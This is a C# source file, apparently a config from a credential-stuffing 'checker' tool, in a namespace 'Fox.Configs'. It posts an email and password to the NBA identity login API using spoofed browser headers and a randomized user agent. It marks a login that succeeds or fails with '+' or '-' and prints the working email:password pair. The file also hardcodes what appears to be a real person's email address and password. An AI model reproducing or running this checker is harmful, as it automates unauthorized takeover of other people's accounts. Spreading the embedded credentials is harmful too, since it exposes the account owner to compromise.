using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class NBA
    {
        public static void nba()
        {
            string email = "jazielvaldez@hotmail.com";
            string pass = "raayja06";
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
                req.IgnoreProtocolErrors = true;
                req.AddHeader("Host", "identity.nba.com");
                req.UserAgentRandomize();
                req.AddHeader("Accept", "*/*");
                req.AddHeader("Accept-Language", "en-US,en;q=0.5");
                req.Referer = " https://www.nba.com/";
                req.AddHeader("content-type", "application/json");
                req.AddHeader("x-client-platform", "web");
                req.AddHeader("Origin", "https://www.nba.com");
                req.AddHeader("Connection", "keep-alive");
                req.AddHeader("Sec-Fetch-Dest", "empty");
                req.AddHeader("Sec-Fetch-Mode", "cors");
                req.AddHeader("Sec-Fetch-Site", "same-site");
                req.AddHeader("Accept-Encoding", "gzip, deflate");

                string payload = "{\"email\":\"" + email + "\",\"password\":\"" + pass + "\",\"rememberMe\":false}";

                string send_data = req.Post("https://identity.nba.com/api/v1/auth", payload, "application/json").ToString();
                if (send_data.Contains("\"success\""))
                {
                    string capture = " + " + email + ":" + pass;
                    Console.WriteLine(capture);

                }
                else if (send_data.Contains("\"error\"") | send_data.Contains("\"INVALID_CREDENTIALS\""))
                {
                    string capture = " - " + email + ":" + pass;
             
                }
             
        

            }
        
        
        }
    }
}
